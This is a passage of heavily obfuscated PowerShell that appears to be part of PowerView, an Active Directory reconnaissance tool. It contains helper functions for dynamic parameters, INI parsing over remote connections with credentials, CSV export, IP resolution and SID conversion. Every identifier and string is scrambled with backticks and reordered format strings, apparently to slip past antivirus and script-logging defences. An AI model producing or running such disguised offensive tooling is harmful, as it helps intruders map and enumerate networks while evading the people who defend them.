    ${IM`pLIcit`c`OnV`E`RTer} = ${st`RU`ctbu`IL`dEr}.("{2}{3}{0}{1}" -f 'e','thod','Define','M').Invoke(("{0}{1}{2}"-f'op_Im','plic','it'),
        ("{7}{1}{2}{8}{3}{5}{9}{10}{0}{11}{6}{4}"-f 'deBy','iv','ate','ic,','alName',' Sta','g, Speci','Pr','Scope, Publ','tic, ','Hi','Si'),
        ${s`T`RU`C`TbUilDEr},
        [Type[]] @([IntPtr]))
    ${iLGenerA`TO`R2} = ${I`mpl`IcITCon`VeRT`er}.("{1}{3}{0}{2}"-f'r','Ge','ator','tILGene').Invoke()
    ${ILgE`Ner`AtOr2}.("{0}{1}" -f'E','mit').Invoke(  (  &("{0}{1}{2}" -f 'GeT-vArI','A','blE')  ('aM'+'gNv') )."Va`lUE"::"N`oP")
    ${I`LgenE`RATO`R2}.("{1}{0}" -f 'mit','E').Invoke( ${AMg`NV}::"L`darg_0")
    ${I`lGENErAt`o`R2}.("{1}{0}"-f'it','Em').Invoke( ( &("{1}{0}"-f 'R','DI') ("{4}{1}{3}{0}{2}" -f 'mGn','Ar','V','iaBle:a','v') )."V`AluE"::"lD`TOK`eN", ${sTruC`TBu`ILD`Er})
    ${i`Lg`e`Ne`RAtor2}.("{0}{1}"-f 'Em','it').Invoke(  ${A`MGNV}::"c`ALl",
         (  &("{0}{1}{2}{3}"-f'GE','T-V','ari','Able') ('Xk'+'R')  -ValueoNLY  ).("{2}{1}{3}{0}" -f'hod','etMe','G','t').Invoke(("{1}{2}{3}{0}" -f 'Handle','GetTypeF','r','om')))
    ${Il`GeNErat`OR2}.("{0}{1}" -f'E','mit').Invoke(  ${A`m`GnV}::"C`ALL",
          ${f`18t}.("{0}{2}{1}{3}"-f'G','et','etM','hod').Invoke(("{1}{2}{4}{3}{0}"-f 'e','PtrToS','t','r','ructu'), [Type[]] @([IntPtr], [Type])))
    ${ilgEnEr`A`T`OR2}.("{1}{0}"-f 'it','Em').Invoke( ${am`g`NV}::"UNbO`X_`Any", ${s`T`R`UCtbUiLD`er})
    ${iL`Ge`NER`ATo`R2}.("{1}{0}" -f 't','Emi').Invoke(  ( &("{2}{3}{1}{0}"-f'm','Te','CHild','I') ('v'+'aRia'+'Bl'+'E:AMGnv'))."va`LuE"::"R`et")

    ${stR`U`Ct`Bui`LdEr}.("{3}{0}{2}{1}" -f 'e','pe','ateTy','Cr').Invoke()
}








Function NE`W-DyNA`M`Icp`ArAM`Eter {


    [CmdletBinding(DefAultPARaMetErSETnaME = {"{1}{0}{4}{2}{3}"-f 'nam','Dy','rame','ter','icPa'})]
    Param (
        [Parameter(mandATOrY = ${tr`Ue}, VAlUefrompIPelinE = ${Tr`Ue}, ValuEfRompipeLInEByProPErtYNaMe = ${tr`Ue}, ParAMeTERsetNAmE = "dy`NaMIcP`ArAmETER")]
        [ValidateNotNullOrEmpty()]
        [string]${Na`mE},

        [Parameter(VAluEfROMPipeLINEByPrOPErtYname = ${Tr`Ue}, pARAmEteRseTnAmE = "dyN`AMICpa`R`A`MeTeR")]
        [System.Type]${ty`pe} = [int],

        [Parameter(valueFrOmpIpeLiNeBYpROpErTYnAME = ${T`RUe}, pAraMETErsEtNAMe = "DY`N`A`MICpaRaME`Ter")]
        [string[]]${A`LIaS},

        [Parameter(vALuEFroMpIpelInEBYPROpeRTyNAME = ${tR`UE}, PARAMeTERsetNAME = "d`y`Na`MiCPAraMeT`eR")]
        [switch]${mAnD`At`o`Ry},

        [Parameter(vAluefRoMpIPelineByprOpERTYnAmE = ${tR`UE}, PARameTERSeTnaME = "Dyna`M`icp`ARA`MeTeR")]
        [int]${pOSi`T`ioN},

        [Parameter(vAlUEfromPIpeliNeBypROPErtynAmE = ${Tr`Ue}, PaRAMeTeRsEtnamE = "DYn`AmICP`A`RA`MeTEr")]
        [string]${HeLpM`E`SsAGE},

        [Parameter(VaLUeFroMpIPElInEBypRoPertYNamE = ${Tr`UE}, paraMETeRsETname = "D`YnAM`iCpaRAmEt`eR")]
        [switch]${dOnt`s`HOw},

        [Parameter(VALuEFRompIpEliNEbyPrOPErTynAme = ${T`RUE}, pARAmEtErSEtnamE = "D`Yn`AMiC`ParAmETER")]
        [switch]${Val`UefRO`Mp`I`P`eliNe},

        [Parameter(ValuEFrOMPIpELInEBYPrOpeRtyNAme = ${Tr`UE}, ParAMeTErSETnamE = "d`YNAMIc`ParAmETER")]
        [switch]${vAlueFrOmPi`pEL`iNEbYP`R`oP`E`RTyNaMe},

        [Parameter(VaLuefrompipelinEBypROpErtyNAMe = ${tr`UE}, paRamETErSeTNaME = "DY`NaMICPaR`AM`Eter")]
        [switch]${vaLU`EfRomrEmA`inInGARgu`Me`NTs},

        [Parameter(vaLuEfrOmpIpeLiNEbyPrOpertynaMe = ${TR`UE}, PAraMEtErSeTNaME = "D`yNAMIcP`ARA`mE`TEr")]
        [string]${p`Ar`A`MEtEr`setnA`ME} = "__ALlPa`RAmE`TER`SETS",

        [Parameter(VaLUefRomPIpelinebYprOPErTYnAmE = ${t`RUe}, PArAmeTersETnamE = "D`Y`N`AMicp`ARametER")]
        [switch]${aL`lOW`NulL},

        [Parameter(ValueFrOmpipElinebYPrOpErtynaME = ${T`RUe}, ParAMETErsEtnAMe = "dyNAmIcpA`Ra`m`Eter")]
        [switch]${a`lLowempT`YS`T`RInG},

        [Parameter(VALuefroMpiPeLinEbyprOPeRTynAme = ${tR`UE}, paRaMeTeRSEtnAME = "dYN`AM`ICp`Arame`T`ER")]
        [switch]${A`lLO`we`mpty`collecti`on},

        [Parameter(vALUeFROmPIPeLiNEBYPrOpERtYnaME = ${Tr`Ue}, paRaMETeRSeTnAME = "DyNA`Mi`CPaR`A`meTeR")]
        [switch]${VA`l`Id`AtEnOTn`ULL},

        [Parameter(vAlUEfROMPIpELiNeBypROpErtyNaME = ${t`Rue}, pAramETERSetnAme = "DYn`A`m`icParAME`TeR")]
        [switch]${vALi`D`ATE`NoTNULl`oreMp`Ty},

        [Parameter(VAlUEFroMpipElInebyprOPeRtyNaME = ${tr`Ue}, paRaMeTerSEtNAMe = "DY`NAMICParA`m`Et`Er")]
        [ValidateCount(2,2)]
        [int[]]${VALId`A`TECo`U`NT},

        [Parameter(vAlUEfROMpipeliNEbYProPertyNAME = ${t`RUE}, paRaMetersEtNAme = "dynA`Mi`CPA`RAmE`TER")]
        [ValidateCount(2,2)]
        [int[]]${v`ALiD`ATEran`ge},

        [Parameter(VaLueFRoMPIpeLINEBYPrOPerTyNAme = ${t`RUe}, PaRAmEtERSEtnAMe = "DY`NAm`iCpa`RAM`EteR")]
        [ValidateCount(2,2)]
        [int[]]${vaLi`D`ATeLength},

        [Parameter(VALuefrOmpIpELINeByPropeRtyNaME = ${t`RUe}, paRAMEtErseTname = "D`y`NaMiCParAME`TEr")]
        [ValidateNotNullOrEmpty()]
        [string]${VAlId`A`Te`PaTTERN},

        [Parameter(VaLueFRompiPELinEbyPRoPerTyname = ${t`Rue}, PaRamEtersetnAmE = "D`YNA`M`icpArA`Meter")]
        [ValidateNotNullOrEmpty()]
        [scriptblock]${VaLi`D`AtES`CrIPt},

        [Parameter(vALUefroMpipeLinebYProPERtyNAME = ${t`RUE}, ParAmETErseTname = "Dy`N`AmI`cpArAMEt`ER")]
        [ValidateNotNullOrEmpty()]
        [string[]]${Va`Li`d`ATESEt},

        [Parameter(VaLuEFROMpIpELInebyproPertyNAmE = ${T`RUe}, PaRaMEtERSEtnaMe = "d`Ynamic`pARaMet`eR")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!(${_} -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw ("{13}{7}{11}{14}{5}{12}{3}{4}{8}{0}{9}{6}{10}{2}{1}"-f 'ma','ctionary object','terDi','na','ge','st','untimeDe','ar','ment.Auto','tion.R','finedParame','y must','em.Ma','Diction',' be a Sy')
            }
            ${tr`UE}
        })]
        ${dIC`TI`onARy} = ${Fal`se},

        [Parameter(MAndAtoRy = ${t`RuE}, ValUEfROmpIpElINebypROpErtyNaME = ${T`RuE}, paRAmetErSeTnAme = "C`ReA`T`e`VariabLeS")]
        [switch]${CreAt`E`Va`RI`ABleS},

        [Parameter(mAnDAtORy = ${tR`UE}, ValuEFROMpipeliNeByprOPeRTyNAme = ${T`RUe}, PAramETersETNaME = "CrEaTE`Va`Ri`ABles")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            
            
            if(${_}.("{2}{1}{0}" -f'pe','tTy','Ge').Invoke()."n`AMe" -notmatch ("{1}{2}{0}"-f 'nary','Di','ctio')) {
                Throw ("{6}{0}{1}{3}{2}{8}{5}{4}{13}{9}{10}{12}{7}{11}" -f 'ndP','arameters mu',' ','st be','tomation.P','agement.Au','Bou','onary o','a System.Man','rametersD','ic','bject','ti','SBoundPa')
            }
            ${Tr`UE}
        })]
        ${b`ouNDpara`meterS}
    )

    Begin {
        ${i`NterNaldICtIon`A`RY} = &("{1}{0}{2}"-f'w-Ob','Ne','ject') -TypeName ("{10}{0}{4}{12}{14}{13}{15}{6}{2}{7}{1}{3}{8}{11}{16}{5}{9}{17}"-f 'm.Management.','me','edPa','te','Aut','tiona','Defin','ra','r','r','Syste','Di','omati','.','on','Runtime','c','y')
        function _`TEmp { [CmdletBinding()] Param() }
        ${cOmMo`NPa`RameT`eRS} = (&("{1}{0}{2}"-f'omma','Get-C','nd') ("{0}{1}"-f'_te','mp'))."PA`RAmeT`ers"."Ke`YS"
    }

    Process {
        if(${CReAtEvARIab`L`es}) {
            ${B`OuNdK`EYs} = ${boUn`Dpa`RAm`Ete`RS}."Ke`yS" | &("{3}{0}{2}{1}" -f'e','bject','re-O','Wh') { ${Co`m`mon`paRaMEtErS} -notcontains ${_} }
            ForEach(${ParAMe`T`ER} in ${b`OuN`dkeys}) {
                if (${pA`Ramet`ER}) {
                    &("{1}{2}{0}"-f'e','Se','t-Variabl') -Name ${pa`RaM`etEr} -Value ${B`O`UndpA`R`AME`Ters}.${PARAm`ET`ER} -Scope 1 -Force
                }
            }
        }
        else {
            ${sT`AlEk`EyS} = @()
            ${STaL`ekE`ys} = ${PsBoU`Nd`Par`AmE`T`ers}.("{2}{0}{1}"-f 'rato','r','GetEnume').Invoke() |
                        &("{1}{0}{2}"-f 'Obje','ForEach-','ct') {
                            if(${_}."vaL`Ue"."PSoB`jEct"."met`HO`Ds"."N`AMe" -match (('^Eq'+'uals'+'J'+'rB')."rEpL`Ace"(([CHaR]74+[CHaR]114+[CHaR]66),[sTriNG][CHaR]36))) {
                                
                                if(!${_}."vAl`UE".("{1}{0}" -f 'ls','Equa').Invoke((&("{0}{1}{2}{3}"-f 'Ge','t-Varia','bl','e') -Name ${_}."K`ey" -ValueOnly -Scope 0))) {
                                    ${_}."k`EY"
                                }
                            }
                            else {
                                
                                if(${_}."vA`LUE" -ne (&("{3}{0}{2}{1}"-f'ar','able','i','Get-V') -Name ${_}."K`Ey" -ValueOnly -Scope 0)) {
                                    ${_}."k`ey"
                                }
                            }
                        }
            if(${StALE`K`e`Ys}) {
                ${S`TALe`kEYs} | &("{0}{2}{3}{1}" -f'For','h-Object','E','ac') {[void]${PSBOun`dPa`Ra`mE`Te`Rs}.("{0}{1}{2}"-f'R','emov','e').Invoke(${_})}
            }

            
            ${unboU`NdPAR`AM`eteRS} = (&("{2}{1}{0}"-f 'nd','mma','Get-Co') -Name (${PsC`m`Dlet}."mYI`NVOcA`TI`oN"."In`VOcatION`NA`Me"))."PAR`A`MEterS".("{1}{0}{3}{2}" -f 'nume','GetE','or','rat').Invoke()  |
                                        
                                        &("{0}{1}{2}"-f'Whe','re-','Object') { ${_}."VaL`UE"."pAraM`eTeR`Se`TS"."K`EyS" -contains ${PSC`MD`lEt}.PaRAmEterSeTNAMe } |
                                            &("{1}{3}{0}{2}"-f'ct-Obje','Se','ct','le') -ExpandProperty ("{0}{1}" -f 'Ke','y') |
                                                
                                                &("{2}{0}{3}{1}"-f 'er','bject','Wh','e-O') { ${PS`B`OU`NdpArAmEt`ERs}."kE`yS" -notcontains ${_} }

            
            ${t`Mp} = ${n`Ull}
            ForEach (${pA`RaM`E`TeR} in ${unboU`Nd`p`ARaMeters}) {
                ${deFAU`Ltv`ALUE} = &("{2}{3}{1}{0}"-f'iable','-Var','Ge','t') -Name ${p`ArA`MeTeR} -ValueOnly -Scope 0
                if(!${Ps`BOUN`DPAr`AMeTE`RS}."T`RYgE`Tv`ALuE"(${pARa`ME`TeR}, [ref]${T`mP}) -and ${DE`FauLtvAL`UE}) {
                    ${PSBo`UndPAr`AM`ETErs}.${Para`meT`ER} = ${deFAul`Tva`LUe}
                }
            }

            if(${DIc`T`IO`NaRY}) {
                ${dp`d`icTio`NArY} = ${D`i`CtiON`Ary}
            }
            else {
                ${Dp`d`icti`o`NAry} = ${iNt`eRNa`ldiCtION`A`RY}
            }

            
            ${g`etvar} = {&("{0}{2}{1}" -f'Get','iable','-Var') -Name ${_} -ValueOnly -Scope 0}

            
            ${aT`Tr`iBuTerE`g`Ex} = (('^(M'+'andatory{1'+'}'+'Po'+'sition{1}Paramete'+'rSe'+'tNam'+'e{1}Don'+'tShow{1}'+'H'+'elp'+'Me'+'ssa'+'ge{'+'1}V'+'alueFro'+'mPipeli'+'ne{1}V'+'alueFromP'+'ipelineByPro'+'pertyName{1'+'}'+'Value'+'F'+'romRe'+'m'+'aining'+'Argu'+'ments'+'){0'+'}')-f  [CHar]36,[CHar]124)
            ${VAlI`datIO`NrE`GeX} = (('^(A'+'llowNu'+'ll{0'+'}Al'+'l'+'ow'+'E'+'mpt'+'y'+'Strin'+'g'+'{0'+'}'+'A'+'llowEmptyCollec'+'tion{0}V'+'alidateCoun'+'t'+'{0}Vali'+'dateLength{0}Valid'+'atePatter'+'n{0'+'}'+'ValidateR'+'ange{0}V'+'alidat'+'e'+'S'+'cr'+'ip'+'t{0}Vali'+'da'+'teS'+'et{0}ValidateNotN'+'ull{0'+'}Validat'+'eNot'+'N'+'ullOrEmpty){1}')-F[CHaR]124,[CHaR]36)
            ${alIA`SReG`EX} = {('^'+'Alia'+'s{0}')-f  [chaR]36}
            ${par`A`metEr`ATTR`ibUte} = &("{0}{1}{2}" -f 'N','ew-Obj','ect') -TypeName ("{12}{10}{3}{4}{7}{6}{2}{0}{11}{8}{9}{1}{13}{5}"-f 'Auto','on.','nt.','m.M','anag','tribute','e','em','t','i','te','ma','Sys','ParameterAt')

            switch -regex (${PsBOuN`Dpa`R`AMet`erS}."k`eYs") {
                ${ATtrIBuTe`R`E`GeX} {
                    Try {
                        ${P`Ara`M`eTErA`T`TRibu`Te}.${_} = . ${G`Et`VAR}
                    }
                    Catch {
                        ${_}
                    }
                    continue
                }
            }

            if(${dPD`iCtI`On`Ary}."ke`YS" -contains ${n`AmE}) {
                ${DpDi`Ct`i`OnA`RY}.${Na`Me}."attrI`BuT`eS".("{1}{0}" -f 'd','Ad').Invoke(${Param`eTERat`TrIb`UTe})
            }
            else {
                ${ATT`RibU`TEcOLLeCt`I`On} = &("{1}{0}{2}{3}" -f'-Ob','New','j','ect') -TypeName ("{11}{6}{4}{3}{9}{1}{8}{10}{0}{2}{5}{7}"-f 'ollec','.O','tio','c','lle','n[Syste','o','m.Attribute]','bjectMod','tions','el.C','C')
                switch -regex (${psbOUN`DpAR`Am`etE`Rs}."KE`yS") {
                    ${vA`Lid`A`Tion`RegeX} {
                        Try {
                            ${PaRaMete`R`oPtIo`NS} = &("{1}{2}{0}" -f 'ct','New-O','bje') -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. ${Get`V`AR}) -ErrorAction ("{0}{1}"-f 'S','top')
                            ${aT`Tribu`T`ECOlL`EC`TIon}.("{1}{0}" -f'dd','A').Invoke(${PAR`Amet`ERO`pT`Ions})
                        }
                        Catch { ${_} }
                        continue
                    }
                    ${aL`iASr`e`GeX} {
                        Try {
                            ${PA`RamEt`eRA`Lias} = &("{0}{1}{3}{2}" -f 'N','ew-O','ject','b') -TypeName ("{5}{6}{4}{3}{9}{1}{2}{0}{8}{10}{7}" -f'lia','tomat','ion.A','nageme','a','S','ystem.M','ute','sAt','nt.Au','trib') -ArgumentList (. ${g`etv`Ar}) -ErrorAction ("{0}{1}"-f'Sto','p')
                            ${at`TRIBu`TECO`L`lEc`TIOn}.("{0}{1}" -f'A','dd').Invoke(${PArA`M`EteRAL`iaS})
                            continue
                        }
                        Catch { ${_} }
                    }
                }
                ${atTrI`B`UT`ECO`lLEction}.("{1}{0}" -f'd','Ad').Invoke(${P`A`Ra`MEtErat`T`RIbUte})
                ${pa`RamE`T`Er} = &("{2}{0}{3}{1}" -f 'w-Ob','t','Ne','jec') -TypeName ("{5}{8}{3}{4}{6}{1}{2}{7}{0}" -f'r','on.Runt','imeDefinedP','ment.Auto','mat','System.M','i','aramete','anage') -ArgumentList @(${na`mE}, ${t`Ype}, ${a`TTrIButE`colL`E`CtION})
                ${dpdi`ctIon`ARY}.("{0}{1}" -f 'Ad','d').Invoke(${N`AMe}, ${PA`RAme`TEr})
            }
        }
    }

    End {
        if(!${creA`TevA`R`Iabl`Es} -and !${DiC`Tion`ARY}) {
            ${DpDi`CTI`O`NAry}
        }
    }
}


function geT`-INI`CoN`T`ent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{1}{4}"-f 'PSShou','ces','o','ldPr','s'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(pOsitiON = 0, mandaTORY = ${T`RUE}, VaLuEfrOmPIPELine = ${t`RuE}, VAlUEFroMPIpEliNeByPRopertYnAme = ${T`RUe})]
        [Alias({"{1}{0}" -f'Name','Full'}, {"{0}{1}" -f'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PA`TH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`eDEn`Tial} =  ${5`R0`Vk}::"EmP`Ty",

        [Switch]
        ${o`UTP`UTOBjE`Ct}
    )

    BEGIN {
        ${mAppEdC`oM`pU`TERS} = @{}
    }

    PROCESS {
        ForEach (${tA`R`gETpath} in ${P`Ath}) {
            if ((${tarG`EtPA`TH} -Match ((("{6}{4}{3}{1}{0}{7}{2}{5}" -f 'wnFwn.*Fwn','wnF','.','nF','w','*','F','Fwn'))-rEplace'Fwn',[ChaR]92)) -and (${Ps`B`oUNdPA`R`AMEtERS}[("{0}{2}{1}" -f'C','tial','reden')])) {
                ${H`OsTCo`MP`Ut`Er} = (&("{2}{0}{1}"-f 'w','-Object','Ne') ("{1}{0}{2}{3}"-f'y','S','stem.Ur','i')(${TARG`ET`Pa`Th}))."ho`st"
                if (-not ${M`ApPEDcom`PUt`E`RS}[${HO`sTcomP`UT`ER}]) {
                    
                    &("{0}{5}{1}{3}{4}{6}{2}"-f'Add-Remo','o','ction','n','n','teC','e') -ComputerName ${h`OSt`c`Om`PuTeR} -Credential ${cRE`DEnt`Ial}
                    ${mapp`edcO`MP`Ut`eRS}[${hostcomP`U`T`eR}] = ${T`RUE}
                }
            }

            if (&("{0}{2}{1}"-f'T','t-Path','es') -Path ${TAr`gEtP`A`TH}) {
                if (${Psb`OUndP`A`RaMETERS}[("{2}{1}{0}{3}" -f'Objec','tput','Ou','t')]) {
                    ${in`Io`BjeCt} = &("{2}{0}{1}" -f'ew-Obj','ect','N') ("{0}{1}" -f'P','SObject')
                }
                else {
                    ${iNI`o`BJECt} = @{}
                }
                Switch -Regex -File ${taR`GE`TPa`Th} {
                    ((("{0}{2}{1}{4}{3}" -f'^d','[(','Su',']','.+)dSu'))-RePLAce'dSu',[char]92) 
                    {
                        ${sEc`Ti`ON} = ${MaTcH`ES}[1].("{0}{1}"-f'Tr','im').Invoke()
                        if (${psbO`U`NDp`A`RAmeTeRs}[("{2}{0}{3}{1}"-f'utObje','t','Outp','c')]) {
                            ${S`eCti`oN} = ${SE`cTI`on}.("{2}{1}{0}" -f'e','ac','Repl').Invoke(' ', '')
                            ${s`E`CtI`OnOBj`ecT} = &("{2}{0}{3}{1}"-f'e','ect','N','w-Obj') ("{1}{0}{2}"-f 'e','PSObj','ct')
                            ${in`Iob`je`ct} | &("{2}{0}{1}"-f'-','Member','Add') ("{2}{0}{1}"-f'oteprope','rty','N') ${s`E`CTion} ${se`CtIO`N`oBJ`ect}
                        }
                        else {
                            ${iN`iOb`JEct}[${Sec`T`iON}] = @{}
                        }
                        ${COMmENT`CO`UNT} = 0
                    }
                    "^(;.*)$" 
                    {
                        ${va`Lue} = ${m`At`cheS}[1].("{1}{0}" -f'm','Tri').Invoke()
                        ${C`oMmEn`T`C`Ount} = ${Co`mMen`TCOUnt} + 1
                        ${n`AME} = ("{0}{1}" -f 'C','omment') + ${c`OMm`eN`TC`OUnT}
                        if (${p`sBO`UNdpAramEt`erS}[("{3}{0}{2}{1}"-f 't','ject','Ob','Outpu')]) {
                            ${N`AME} = ${nA`mE}.("{1}{2}{0}"-f 'lace','R','ep').Invoke(' ', '')
                            ${inIOb`J`E`Ct}.${sEc`T`IOn} | &("{2}{1}{3}{0}"-f 'ber','d','Ad','-Mem') ("{3}{1}{0}{2}" -f'per','o','ty','Notepr') ${n`Ame} ${vAl`UE}
                        }
                        else {
                            ${iNIoB`J`eCt}[${sEctI`on}][${N`AMe}] = ${v`ALUE}
                        }
                    }
                    ((("{3}{2}{1}{0}" -f '}s*=(.*)','{0','.+?)','(')) -F  [ChAR]92) 
                    {
                        ${N`AMe}, ${Val`UE} = ${Ma`T`cHES}[1..2]
                        ${n`AmE} = ${n`AME}.("{0}{1}"-f 'Tri','m').Invoke()
                        ${V`AluES} = ${VA`lue}.("{0}{1}"-f's','plit').Invoke(',') | &("{0}{1}{2}" -f'Fo','rEach-Obje','ct') { ${_}.("{1}{0}"-f 'rim','T').Invoke() }

                        

                        if (${pSBoU`ND`p`ArAMetErS}[("{0}{2}{1}"-f 'O','bject','utputO')]) {
                            ${nA`me} = ${n`AMe}.("{1}{0}"-f'eplace','R').Invoke(' ', '')
                            ${IN`iobJ`ECt}.${se`cTIoN} | &("{2}{3}{1}{0}"-f 'r','embe','Add','-M') ("{2}{1}{0}{3}"-f'ropert','tep','No','y') ${Na`Me} ${V`A`LuEs}
                        }
                        else {
                            ${I`NIO`BjE`cT}[${s`eCTi`oN}][${N`AME}] = ${VAL`UEs}
                        }
                    }
                }
                ${Ini`oBJe`ct}
            }
        }
    }

    END {
        
        ${MaP`pedCo`mPU`TErS}."Ke`ys" | &("{5}{1}{0}{3}{4}{2}" -f 'moteCon','ve-Re','n','ne','ctio','Remo')
    }
}


function Ex`pOrt-p`Ower`ViEWcsV {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{4}{2}{0}"-f 'ess','oul','c','PSSh','dPro'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(MANDatOry = ${t`RUE}, valuEfRompipeLiNE = ${Tr`UE}, VaLuEFRoMpiPElineBYpropERtYNaMe = ${Tr`UE})]
        [System.Management.Automation.PSObject[]]
        ${inPu`Tob`JECT},

        [Parameter(mANdaTOry = ${Tr`Ue}, POsitioN = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${pA`TH},

        [Parameter(poSitIOn = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        ${D`Elim`Iter} = ',',

        [Switch]
        ${A`pPend}
    )

    BEGIN {
        ${OuT`puT`pATH} =  ${J4o`l2}::"GetFU`ll`PAth"(${Ps`B`O`U`NdPA`RaMETers}[("{0}{1}"-f 'P','ath')])
        ${exi`Sts} =  (  &("{4}{2}{3}{1}{0}"-f 'iteM','lD','eT-','chI','G') ("{2}{0}{1}{3}" -f 'IAbl','E:NQ','vAr','9Ta'))."VA`LUE"::("{0}{1}" -f 'Ex','ists').Invoke(${oU`T`PuTp`ATh})

        
        ${mUt`EX} = &("{2}{1}{0}" -f'Object','-','New') ("{3}{1}{2}{4}{0}"-f'g.Mutex','m.Th','r','Syste','eadin') ${fa`LSe},("{0}{1}" -f'CSVM','utex')
        ${n`ULl} = ${Mu`Tex}.("{1}{2}{0}" -f 'tOne','W','ai').Invoke()

        if (${pS`Bo`UNdPAra`Me`T`ErS}[("{0}{1}"-f'Appe','nd')]) {
            ${f`IL`eMode} =  ( &('ls') ("{1}{0}{2}"-f'rIABlE','va',':t0y'))."va`luE"::"Appe`ND"
        }
        else {
            ${F`iLEM`oDe} =   (&("{0}{2}{1}"-f 'gE','e','T-VAriABL')  ("{0}{1}"-f 'T','0Y')  -VALuE )::"cRe`ATE"
            ${e`xISTs} = ${F`Al`SE}
        }

        ${C`svsTr`eAm} = &("{1}{3}{2}{0}" -f '-Object','N','w','e') ("{3}{0}{1}{2}" -f'ile','S','tream','IO.F')(${ou`T`PuTP`AtH}, ${fI`l`emOde},   (&("{2}{0}{1}"-f 'E','t-itEM','g') ("vArI"+"ABLe:"+"Zxh"))."V`AlUE"::"w`RITE",   ${P0`E7X}::"r`EAd")
        ${C`SVWRIT`Er} = &("{1}{3}{2}{0}"-f'ct','New-Ob','e','j') ("{4}{1}{5}{0}{3}{2}"-f 'treamWr','IO.','r','ite','System.','S')(${CSVst`R`eaM})
        ${C`SV`wRIT`Er}."aUt`OfL`U`Sh" = ${tR`Ue}
    }

    PROCESS {
        ForEach (${E`NT`RY} in ${inP`Uto`BJECT}) {
            ${O`BJect`Csv} = &("{0}{1}{3}{2}"-f 'C','on','Csv','vertTo-') -InputObject ${e`NT`Ry} -Delimiter ${D`El`iMiT`ER} -NoTypeInformation

            if (-not ${EXI`STs}) {
                
                ${O`BJEct`cSv} | &("{0}{1}{2}{3}" -f 'ForEa','ch-','Obj','ect') { ${Csvw`R`ITer}.("{2}{1}{0}{3}" -f 'Li','e','Writ','ne').Invoke(${_}) }
                ${exiS`TS} = ${tR`Ue}
            }
            else {
                
                ${OBj`ecTc`SV}[1..(${oBJE`CTC`Sv}."LEn`gth"-1)] | &("{1}{0}{2}{3}" -f'-Obje','ForEach','c','t') { ${C`sVw`RITeR}.("{0}{1}{3}{2}" -f 'WriteL','i','e','n').Invoke(${_}) }
            }
        }
    }

    END {
        ${MU`TEx}.("{2}{1}{0}{3}"-f 'seMute','elea','R','x').Invoke()
        ${cs`Vwri`T`ER}.("{0}{1}" -f 'D','ispose').Invoke()
        ${cSvs`TR`Eam}.("{0}{1}{2}" -f 'Dis','pos','e').Invoke()
    }
}


function RESO`lVE-I`PADd`RESS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}{3}"-f 'PS','ShouldP','roce','ss'}, '')]
    [OutputType({"{7}{6}{10}{5}{3}{2}{1}{9}{12}{0}{8}{11}{4}" -f'ion','t','n','ageme','ect','Man','s','Sy','.PSCust','.A','tem.','omObj','utomat'})]
    [CmdletBinding()]
    Param(
        [Parameter(posITIon = 0, vAluefROmPiPELIne = ${T`Rue}, vAlUEFrOMpiPelINebyPrOpERtynAmE = ${tr`UE})]
        [Alias({"{1}{0}{2}"-f 'os','H','tName'}, {"{0}{3}{2}{1}" -f 'd','ame','stn','nsho'}, {"{0}{1}"-f'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COmPuTe`R`Na`Me} = ${eNv:`C`OmpUT`ern`AmE}
    )

    PROCESS {
        ForEach (${co`MPuTEr} in ${cOMput`er`NAmE}) {
            try {
                @(( ( &("{1}{2}{0}"-f 'LditeM','ch','i')  ("{2}{1}{0}{3}" -f'e:fdIz','arIabL','V','g4') )."VAl`Ue"::("{3}{0}{2}{1}" -f'st','try','En','GetHo').Invoke(${Co`mPu`TEr}))."a`DDRe`Sslist") | &("{4}{1}{3}{2}{0}"-f't','Each','Objec','-','For') {
                    if (${_}."ADDrE`SSF`AMily" -eq ("{2}{1}{0}" -f'work','t','InterNe')) {
                        ${o`UT} = &("{0}{3}{2}{1}" -f 'Ne','ct','bje','w-O') ("{2}{0}{1}" -f 'SO','bject','P')
                        ${O`UT} | &("{0}{2}{1}" -f'A','mber','dd-Me') ("{0}{2}{1}"-f'Noteprope','ty','r') ("{3}{2}{1}{0}"-f 'me','puterNa','m','Co') ${CO`M`PUTeR}
                        ${O`UT} | &("{1}{2}{0}" -f '-Member','Ad','d') ("{1}{2}{0}" -f 'perty','N','otepro') ("{0}{1}{2}"-f'I','PA','ddress') ${_}."iPaDDrEssTO`S`Tri`Ng"
                        ${O`UT}
                    }
                }
            }
            catch {
                &("{2}{1}{0}" -f 'bose','r','Write-Ve') ('['+'R'+'esolv'+'e-IPA'+'ddress] '+'C'+'ould '+'n'+'ot '+'re'+'solve '+"$Computer "+'to'+' '+'a'+'n '+'I'+'P '+'Ad'+'dress.')
            }
        }
    }
}


function co`NvertTo-s`id {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{4}{2}" -f'S','h','dProcess','PS','oul'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(MandatoRy = ${tR`UE}, vAlUefroMpIpeLInE = ${T`RuE}, vaLUefROMpiPeLInEByPrOPERtynaME = ${tr`UE})]
        [Alias({"{0}{1}"-f'Na','me'}, {"{2}{0}{1}" -f'i','ty','Ident'})]
        [String[]]
        ${ObJ`eC`TnAme},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`A`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{3}{2}{1}"-f'mainC','ller','ro','ont','Do'})]
        [String]
        ${seR`V`eR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`eDeN`Ti`AL} =  (&("{0}{1}{2}" -f 'GEt-C','H','IldiTeM')  ("v"+"aRiabl"+"e:"+"5R0vK"))."v`AlUE"::"eM`pTy"
    )

